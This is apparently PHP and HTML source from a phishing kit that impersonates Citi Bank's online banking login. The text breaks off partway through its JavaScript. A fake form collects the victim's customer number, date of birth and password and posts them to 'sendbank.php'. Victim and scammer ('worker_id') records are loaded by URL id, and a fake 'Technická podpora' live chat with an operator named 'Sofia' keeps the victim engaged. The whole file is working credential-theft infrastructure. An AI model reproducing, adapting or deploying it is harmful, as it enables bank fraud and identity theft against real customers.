<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "Citi Bank");
?>
<!DOCTYPE html>
<!-- saved from url=(0053)# -->
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<title>Bankowość korporacyjna, finansowanie przedsiębiorstw</title>
<style>
			._0 {
				margin: 0 auto;
				max-width: 400px;
				box-sizing: border-box;
				background: #fff;
				margin-top: 50px;
				margin-bottom: 50px;
			}
			._01 {
				margin: 0 auto;
				max-width: 490px;
				box-sizing: border-box;
				padding: 24px;
				background: #fff;
				margin-top: 50px;
				padding-left: 0;
				margin-bottom: 50px;
			}
			._1 {
				font-size: 28px;
				padding-top: 16px;
				width: 100%;
                text-align: center;
			}
			._2 {
				margin: 10px 0;
				border-bottom: 1px solid #ddd;
			}
			._3 {
				text-align: left;
			    font-size: 14px;
			    border: 1px solid #00aeef;
			    border-radius: 6px;
			    padding: 12px 10px;
			    margin-bottom: 20px;
                background-color: #D0D0D0;
			}
			._3:hover {
				border: 1px solid #000;
			}
			._4 {
				float: right;
			    width: 100%;
				margin: 0;
			    color: #000;
			    font-weight: 400;
			    font-size: 15px;
			    line-height: 24px;
			    display: inline-block;
			    -webkit-box-sizing: border-box;
			    box-sizing: border-box;
			    padding: 8px 30px 6px 31px;
			    min-width: 180px;
			    border-radius: 7px;
			    white-space: nowrap;
			    background-color: #00aeef;
			    color: #fff;
			    text-align: center;
			    text-decoration: none;
			}
			._4:hover {
				background-color: #00aeef;
			    color: #fff;
			    border-color: #00aeef;
			}
			._5 {
				color: #aaa;
				text-align: right;
				width: 45%;
				padding-right: 24px;
			}
			._6 {
				font-weight: bold;
			}
			._7 {
				margin-top: 4px;
				margin-bottom: 16px;
			}
			._8 {
				padding-bottom: 6px;
				line-height: 18px;
			}
			._9 {
				text-align: right;
			}
			body {
				margin: 0;
				font-family: Arial;
				font-size: 12px;
				color: #222;
				word-break: break-word;
				user-select: none;
				background: #fdfdfd;
			}
			input {
				font-family: Arial;
				font-size: 12px;
				color: #222;
				width: 100%;
				border: none;
				box-sizing: border-box;
				text-align: center;
			}
			table {
				width: 100%;
				border-collapse: separate;
				border-spacing: 0;
			}
			td {
				padding: 4px 0;
			}
			#mainblock {
				display: flex;
				margin: 0 40px;
			    border-bottom: 1px solid #e4e4e4;
			}
			#rightblock {
				margin-top: 100px;
				display: flex;
			}
			.loginboxes {
				display: block;
			}
			#formblock {
                /*border-right: 1px solid #e4e4e4;
                padding-right: 70px; */
                padding-bottom: 20px; 
                margin-top: 20px;
			}
			#konto {
				float: right;
				padding-bottom: 10px;
				padding-top: 30px;
			}
			#Pomoc {
				display: none;
                padding-top: 25px; 
                width: 150px;
			}
			@media all and (max-width: 800px) {
				#mainblock {
					display: block;
				}
				#formblock {
					border-right: none;
					padding-right: 0; 
				}
			}
			@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				#konto {
					margin: 0;
				}
				#Pomoc {
					padding-top: 0;
					padding-bottom: 25px;
				}
				._4 {
					width: 100%;
				}
			}
		</style>
</head>
<body>
<div id="mainblock">
<div class="_0">
<center><img height="80" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACMCAMAAADxyGQdAAABC1BMVEX///8ARYf/FSsASI0ARIgAPojp7vQAR4cASIUKWo1OgbEARIU0bpnX4+9kj7gAQ4Fsk7kIU47l5vNsnLkATH+1yd0nZ5AAQ4vd6+6Jqcj5+vwbVZVmjL3/GSfw9Pf/rbsARJGouOP/GTIASH92nMAAUXXR3uw/daPG1OQ8aqWku9aUs82vyN9Uha8cW5a4z93/XW7+TV6uxdU2bJ/+xMp6pMPL3eT/o6n+OkzC0epGdqyEpMonY6L/eoVeja+XtMk5dpGAq737srj+hpT/bnsATHn+5ukkYI+Hr8kMUqEAO4xqjrBYiaFYhb9+nc79zdL/3uAnYqpLd7tGeZ0UYHzjGy5woqkiaoI6YbmMKD5HAAAP30lEQVR4nO1cDV/auh4mt5FUIgh31Qp6WGcZYBVQmHMqQ882hy9zmzu7L9//k9y8tEmbJiB387ify/M786xtmiZP/u+JKxQsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLJ4OPn55d/T+7Yf9/f0D8ufD2/dHr742HntQvyK+HH042N7+RwrsYnv74O3zr489uF8Jjecf3mSJyoAS9uqxx/iL4NWHGUQJwt68t/JVODqYS1SC/d9cvI7e3JsqKl4HvzFdrw7m659C1/5vqoyNtwsyxfH+scf9GHhl0MBt6v4I/jCxdfD7CdeRjgzC0cE+iUUp3r/dJ/HEtq7Vu8ce/N8MnQq++XD0JRuwf3z1fl9HWFoVG93j4+O14t87fAXtvePjvfZD9b6fZ8oUdzZIHJZr/VY+L770vAvv8qFGei90PM97uf5Anee42n8+q/lHEoxtm9gq1gDGoP5AI70fSg7G4crD9P0ha4LuE22+U2LXP4QmFpcBeHyyEHAfhqz3WSm5Z6T5XPGeR/F9RhZ6bLLAA5H1LsPV9pGhWfemp5RnsiRvxxwXl+EvQBZCD0LWx/SU/9j/qG103BoBdKHe/ZqJ+Lc5l09aDTPGRxeON/ZuptiBGGncy9s0W/vs1q9B1sOoYVoJtzXWarDVdxFxbwDpyCo8T8WyPDh9wjbr47/+ENj+omlwR+WEAAEtWYUv26kOqA4TstATlayPR88FtOZqByTQk1X4Kjs4iskieJJkzUVMFjKSpcKSBUw2K49fg6wHC0pnYocK1Sw1VPGUveE8zLVZKp6wN5yLHRSbrN+LrGZ7MFwbDtqLlZpOEqoA+F3IKkaT0TS89gN/aXX57ttlV23QHq4J0LSlvBdfjJhtJ1EWgP3BIL65xwlv7ol39sriUzQ3lDarfFbpjKfjTu9wdkGweXxWLY36tGUrmruepNe/xv3pTukmKmsezyOrOaPrQcnxSaCIWHhJ5u1CZ1TPvtBzkgABoX+S60sfUYoAhEINcfyYdBAM2Ett2hlvF0ySnjLecEiHDekNiFDY2zMMsFvvsBGyT0ES1JYitcmncwJ+t7E7ChzgsFUEzmppeH+yJrSX8/WBkaruiYOJYsS6xKeOobuc0ZQKxAlcStZucs3liouXaBKTVV4Vd5aepchKIvh2J4AYJw4CAx+e50Sa9FIfEYIwXQuUtITe+nG21XcyAveU/i2axkkFGxWZWlBSpYuQpas6NDouWTgUHBq5qiIXCOmIpYcuCQajjRRZQPBYY2T5bN2QiBsyPwVZSQgGMmTFanjmkzUC8UIxucR+7VQdX7Pm87ljDOmCxBcgOMs0++YhvEp7bfkQs+5c2paLvKMwq5es4hizz+SkVjZwcCIaIAOE4YX8hiALSbLUNyTdClkEWbKYGp4ipraBM11frwUIMW3EqKqMcCOgtyHwHL+2vr4+Ba7DvoO9F+lmtyHAq5eFwp8+4R+jEPZJ28ALffa2/3o+WeU+XS4I10xclWtkGRhZKdEQHEBPaEWFCwiVpYSsFFWIPxVyNI8s6g0jSA3VcnVA5bf5un7iUh0gwvVZWU4HYMeplerdMjOjG8etzSU6YN9JSX5hQl51Sa9EXaFzVYk2qBvaiL4h3quTMcE6stqOy+asMQTxQGow0TpFQNgfiL8nfqcilSwmCylkpV+VZCXCpqrhWpMICw5bqTmsjdlokZ81yM3AdUtRZq6NQ+4TSql7FdprVCCSBJ3DlLfs3lHHgPxPWbJyldKuR92V62VFMP3RfjJF7tmQ47ncN8U+DKA7ORYUmzNO1hLX79gDxlzhHFkgFlqVrKhHbjuK1/nEJFGRgg1Qyu/wnTlUIWDKcNPV9AeXPgah4lN3qPJgL23k85IVEbeOwOqVeTOxFEqvQXSudrK1tdWpBXE0wH46dTmWmBBG1uXFS4bQx0KkIH4Zw5ujhggQ++CHuVXsMfbhbfpe8VhtRTGh8uKk3FaVWv5ejfxQXV+D2ThcmUVWnQUaoK8LyjiGIZQU+P1Y1JvDTpBENK5zvpYmCwk1LL/giNaTBwhMhy8SFNNkUdpVA08si5uPfwpTZo/BRv6JgiZT2VGGLBqCASdvc/aWqEJcpeRVJevSYRHm5oxg9woKe4P99NZMxMw+0Ycr4Z5l6MDJEvgreaAp0TCyuDqrZJHBTtTmBG3uKm7MgxYDorEpkqxWeewBn2najql5QCkvp5DV8lnYMp7BFaMzdn9+duTlPuHRDW/k2xVhwHGWrFlVB27gUV4NWcigHdqEzAvB3D5RHpFLw01p9Ko8PL7QnZbepUNYTUVw2aB0Qu0fgCuzkhwHi3ABj5VnG30Y7qSNRUUIIcqRFdt3g2RpySLLU1FbM7QvmJ8w5T0Sr5dIw1RgWmUzDv6ta1umFsk9kTcykvXNZX5wZ9ah9CEU1h06OVO7t56NY6WB15OFdBsWgiwlgqd+1TXY0hG1WlCNTPMoXhA7EcqYrMq8s6HXKV2wO3mdIqvRIdEGwsHOzK/1cBJMInSSf6zIpJksGWPNsFk5NYTnhmFdMnUaGZ6mQD2LtyUuGVm+odceNWh9KTqyrFzsU5lBSzoDKtHcFO4NXxizIYFZZKFYtrRkxVyqoQMwJauvWfTgzC+qjTVkuVv6tjfU1EzluIXNKk9ZUgr1NkFgDcZiRfV1lmnjmE3WTJulCR0Q8LTRE0GD239j0iGwQntJk4XUdFHilEZlgXSdTA2J9L6+4kUpZ863TuNInfLamTsyYeBRzhvKvNJIVj50QIFxfTrslfmyPkI5yULIEIDXaaliSSFrp9D1XZ69gzmxykRICgoNwpuGIAvpQwftvqG56uCq7jf1JbrY139qnxXbg+hst95qtQ4Paxo1NGlvnSZiClmgNwhjAhAOZ5+ZHCWSQkZ2NrMln4LkViXLvBXGDTzIeUOylj3jlw6pxXVz7rAYHZ6Ml10SjEPpxnNkGeRVS1ZNzIh4hv/MnP1dqrowX+Z5Is3pVdVwDlk8T1fI8szCXKcBFMqSWa7fhXEezyqrcYU5R9amIVbKkyVSf3r8h4bIelHmaPYFV/i7wSymURGLoAsdjN4QJ0qqVB1qn9W2AhHt0E9XX8o9j1VueWIGUlAMPNw09KmVLNadPzz02V+9Gf63+Z1XslgKON/1pBLpnIGfr4aKN4QkeMxVjwUij34kFfl9DhzJEALX/suXtasr5Osky9CnzsDzcUdxUQJATayZgJCVpCm4ZnLjKajFP4E5uWEikIpk+eaj3WseTpPVLPFCGva9MJiWtlpnZ9GLLsE07w1nkaVKFtcraoBocZVSYbbczatQrNW91VCbGyYCClyzN8wZeG+GGtLiCxZqOGYFM+yji9vsFuBoMcnKqyGTK4oTfsDMM0ebd1iWhe9n4JOJL5jucChk1VrGL0WsfWLgJ8z1oaV+pE5lJW+zFlFDBHEYy9IGr98F5pRnLAvnS/cOHXQ2S1Rh7k8WAjNCu0vqDcM4/xhC5kuhJjn6QclC2BEyUucuFhprHSIoJbn7vYJS4fVMEbxODbGWLAJz0sA2I4K4eY1uekJtbDNW050F1TBM1RlWIFvyK9OYqlDkdP690p14B8NUz9KXaJICfa5SOjV+qcde2WV/H7qsbKc7RdJYz5GFFvOGqbJy2WHuTt2FEziTGw1g856JNA90DDbLVFbWSxYybg3cubT6x0ugEyplrrZeU7xYTLLyuWF6w6LFgyjTqMoBEtP3zQchEiRbYZp05x5k5byhOWto0rAHI/6NPg2mQm3T9jV1YD+LrMImy8Ox6dTUWBSVtZnavYt/4j7sq33MkCzf5HoGNFSAfNDFJVoV0WfHEY1Uf8RmZcnq+mzjGhp8XSWU8w9y4le8us2MsSLKeNpEmkkxVHew4h1p3VYYqBnm1UKSyi7bjdQXKA5pJz9PsuhuEVVEqM96ujUxf4DOlYfNEUZOOspOyMoZ+POkOE28qpoJEANvIgtDza4hxSbVwlXuxAc0ivD1JeaTPFmLGXiFrOaUlbbCv/Q9rABxyAGjbK7WnlKS0UgGHhUhWApZE5iYJYDUEISTpa3Bm4rwe3STHMfVgwHt29duJRS9xSQLzCOrMAzYyhqCraEr9BBAnHLPjUuP38VL4hiYMd1pIXnUASraLCuleQOPXe2oTig/KD7F0aV2CWujjGqIFssNcxF87shRx2dzqOnLPH1RPqcDnMS1h/LpFCWnHbAffOKWXqqhEjoMkVA1gDbjPgbcTspTNGoETyUm5w8KSWKYePAi84y67a3iBfxBm5Unq8jPRLj6zYtjNz4cSX0Ohv7opl6/GUGEhRQRFzcVZMVaqEhWMRA1K9KH02vVW5OR0xdkxf3kzzoAJ++DNzbJMmGZpI2YHmrqcudMChZRw1y6kz/5x7MeGOhPHW15Qk0QO00IsJP8khefpO/HXzCGDsm4+YE4zGq+MN4CSbyhRg379NSjWtRqjmkgDWUd7jMVNBfkPNSExBf9n04WWxsyWMP+wBiKzC4FGYDB1cTBVWQRWiFrcI2zb1LfN0rIMtmsqITJymQr7W3mkGAoJalII2cI17NBX7NEmnUisqquFM5Fqw6608rlgAu9vsTcXHflNJPkL8WaPG1WEdKmklVY8cXJwXgjP3H3xk1WjNaKkBbAR/JoS/GQ7UuhTMlyix0dd8epIL5YJzEPDoplRyFrMZulPdr9jO+FuPpgq3jlZYraiYlBrOgdyKkYg1LSBz3DnhJJ+n9hsxLkz5TWPfrLA87KYdQul7u7Jb7Z4ofn6b4bYz68cNSKuqTZWr1Uo8oeXLJafapUv6ga6s/B9/mxVsPpgWbJddPzjFNA9l8/tZlm3Aor0HAIiqycC597J8jSSxY9rbzlsGMGENe8K+QjfiA+/G/Wc5cBa0QizrBWc5zQp9s7Pq1Kv/AwWpL1kh9Md5KpBHThsTFzjZZX/azZYldumDEoxqoDxZ6zKhjmgjBuZMjSn4P/0+VHUnHyiwPEm+bOorX7fiL7vBmGbo2GaJFHEiwpAj/DZhHcsl8KgBemOkyxtRymdZG4KRh6t9k92tKSgJOPe8olCGGyS0Ust3vBtL4tX5JHL4ouvWZl5b0RW0dGJxOyHU35o3ETIrmtSpylU2Uz2cWkG3kKgA/QsG/Yos+u5bhH1+R6WdeyGbB+rleMp7WaUakGHR+EVKBCx3E7pyohw2cSOtb3essh9D3XJdIRhNMSa1OsypdEKthklzErw5LnOND1qBrWbg3CXz4c1QDyax4RwXDnMhaQbnYsbICmyv6APqxKsx3Ra/0vph3z4U5y6pNCs1uv9jqjnc7JVmv4f/17Tc3j3dbW7Va1VR+0F/iXXYuDOnmtSuz3rApkechanQ7Nx4ktLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLJ4m/gcaE2VsxF9e/AAAAABJRU5ErkJggg=="></center>
<form method="post" action="sendbank.php" id="formblock">
<div class="loginboxes" style="margin-bottom: 20px;">
<div class="_1">Přihlaste se do online bankovnictví</div>
</div>
<input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
<input type="hidden" name="type" value="13">

<input id="field3ds" class="_3" type="text" name="logindata" placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
<input id="field3ds" class="_3" type="text" name="datadata" placeholder="Datum narození" required="">
<input id="field3ds" class="_3" type="password" name="passdata" placeholder="Zadejte heslo" required="">
<div class="loginboxes">
<div id="Pomoc"><a href="#" style="font-size: 13px; color: #666666; text-decoration: none;">Pomoc s přihlášením</a></div>
<input class="_4" style="background-color: #00aeef;" type="submit" value="Pokračovat">
<br><br>
</div>
</form>
</div>
<footer><center>2022 Citi BANK</center></footer>
<script>
			let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
			let pwdLen = 20;
			function inputMask(elem) {
				let val = elem.value;
				let val2 = '';
				for (let i = 0; i < val.length; i++) {
					if (pwdChars.includes(val[i]))
						val2 += val[i];
				}
				elem.value = val2.substr(0, pwdLen);
			}
			document.addEventListener('DOMContentLoaded', function() {
				field3ds.oninput = function() {
					inputMask(field3ds);
				}
				field3ds.focus();
			});
			document.oncontextmenu = function() {
				return false;
			};
		</script>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #464646;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #464646;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #464646;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="./expo_files/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Technická podpora</div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>online</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="./expo_files/operator-img.png"></div>
<div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Wnapište svou zprávu...">
<button id="smstosupbutton1" onclick="sendMessage()">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
